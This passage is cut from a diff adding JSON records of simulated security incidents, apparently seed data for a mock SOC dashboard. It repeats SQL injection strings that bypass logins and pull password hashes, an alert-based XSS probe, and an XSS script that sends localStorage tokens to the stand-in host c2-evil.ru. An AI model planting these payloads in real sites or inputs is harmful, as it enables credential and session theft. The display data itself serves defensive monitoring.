+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296463673",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:51:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296459672",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:50:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296457669",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:50:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296453662",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:50:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296449638",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:50:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296443627",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:50:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296441623",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:50:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296437616",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:50:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296435606",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:50:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296431590",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:50:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296429570",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:50:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296427566",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:50:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296423554",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:50:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296421538",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:50:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296419524",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:50:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296417520",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:50:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296415512",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:50:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296413511",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:50:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296409496",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:50:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296407488",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:50:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296403466",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:50:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296401459",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:50:01",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296399456",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:49:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296397457",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:49:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296395454",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:49:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296391436",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:49:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296389424",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:49:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296387423",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:49:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296385408",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:49:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296383390",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:49:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296379382",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:49:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296373357",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:49:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296371355",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:49:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296363318",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:49:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296361308",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:49:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296353286",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:49:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296349254",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:49:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296335201",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:48:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296333193",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:48:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296325164",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:48:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296321154",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:48:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296315142",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:48:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296313136",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:48:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296309129",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:48:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296307128",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:48:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296303106",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:48:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296301095",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:48:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296299093",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:48:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296297080",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:48:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296295077",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:48:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296293076",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:48:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296291068",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:48:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296289065",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:48:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296285061",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:48:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296281040",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:48:01",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296279033",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:47:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296271011",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:47:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296269004",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:47:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296260971",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:47:40",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296258965",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:47:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296256953",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:47:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296254947",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:47:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296252947",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:47:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296250935",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:47:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296248932",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:47:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296246923",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:47:26",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296244914",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:47:24",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296240898",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:47:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296238896",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:47:18",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296236883",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:47:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296234872",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:47:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296228846",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:47:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296226831",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:47:06",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296224816",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:47:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296222800",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:47:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296220799",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:47:00",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296216782",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:46:56",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296214782",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:46:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296212782",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:46:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296210782",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:46:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296206767",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:46:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296202758",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:46:42",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296200750",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:46:40",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296198742",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:46:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296196737",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:46:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296194732",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:46:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296192721",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:46:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296190708",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:46:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296186698",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:46:26",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296184697",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:46:24",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296180683",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:46:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296178680",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:46:18",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296176678",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:46:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296170663",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:46:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296168659",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:46:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296164648",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:46:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296162636",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:46:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296160631",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:46:00",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296154622",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:45:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296150602",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:45:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296146594",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:45:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296144587",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:45:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296140570",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:45:40",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296138568",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:45:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296136558",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:45:36",
